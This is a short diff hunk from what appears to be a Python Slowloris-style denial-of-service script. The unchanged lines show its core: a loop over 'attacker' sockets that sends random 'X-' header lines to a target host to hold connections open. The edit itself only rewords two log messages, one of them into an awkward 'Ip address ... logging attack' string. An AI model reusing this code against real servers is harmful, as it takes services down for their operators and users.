@@ -100,8 +100,8 @@ def main():
 
     while True:
         try:
-            logging.info("Attacking {} with {} attackers".format(host, connections))
-            logging.info("Keeping {1} attacker connections alive.. ".format(len(attackers)))
+            logging.info("Info attack {} with {} attackers".format(host, connections))
+            logging.info("Ip address" +str(ip)+ " logging attack")
             for s in list(attackers):
                 try:
                     s.socket.send("X-{}: {}\r\n".format(randint(0, 50000), randint(0, 50000)).encode())
